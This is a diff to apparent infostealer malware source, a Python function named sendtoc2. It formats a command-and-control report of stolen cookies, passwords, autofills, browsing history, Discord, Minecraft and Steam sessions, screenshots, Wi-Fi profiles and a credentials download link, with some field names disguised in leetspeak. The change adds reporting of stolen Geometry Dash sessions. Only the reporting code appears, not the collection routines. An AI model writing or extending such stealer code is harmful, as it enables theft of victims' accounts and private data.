@@ -835,7 +835,7 @@ def sendtoc2(file):
           "embeds": [
             {
               "title": "GOD BLESS AMERICA",
-              "description": f"```Total C00K135: {str(cookie_count)}\nTotal P455W0RDS: {str(password_count)}\nTotal AU70F1LLS: {str(autofill_count)}\nTotal History: {str(browsing_history)}\nTotal D15C0RD: {str(discord_accounts)}\nTotal Minecraft Sessions: {str(minecraft_sessions)}\nSteam Session: {'Yes' if steam_session else 'No'}\nScreenshot: {'Yes' if ss_success == 1 else 'No'}\nW1F1 N37W0RK5: {str(wifiprofiles)} \n```\n\ncreds: ||{download}||",
+              "description": f"```Total C00K135: {str(cookie_count)}\nTotal P455W0RDS: {str(password_count)}\nTotal AU70F1LLS: {str(autofill_count)}\nTotal History: {str(browsing_history)}\nTotal D15C0RD: {str(discord_accounts)}\nTotal Minecraft Sessions: {str(minecraft_sessions)}\nSteam Session: {'Yes' if steam_session else 'No'}\nGD S35510N: {'Yes' if gd_session == 1 else 'No'}\nScreenshot: {'Yes' if ss_success == 1 else 'No'}\nW1F1 N37W0RK5: {str(wifiprofiles)} \n```\n\ncreds: ||{download}||",
               "color": 3866871,
               "author": {
                 "name": "KirkG"
@@ -863,6 +863,7 @@ Total History: {str(browsing_history)}
 Total Discord Accounts: {str(discord_accounts)}
 Total Minecraft Sessions: {str(minecraft_sessions)}
 Steam Session: {'Yes' if steam_session == 1 else 'No'}
+Geometry Dash Session: {'Yes' if gd_session == 1 else 'No'}
 Screenshot: {"Yes" if ss_success == 1 else "No"}
 Wi-Fi Networks: {str(wifiprofiles)}
 Credentials: {download}
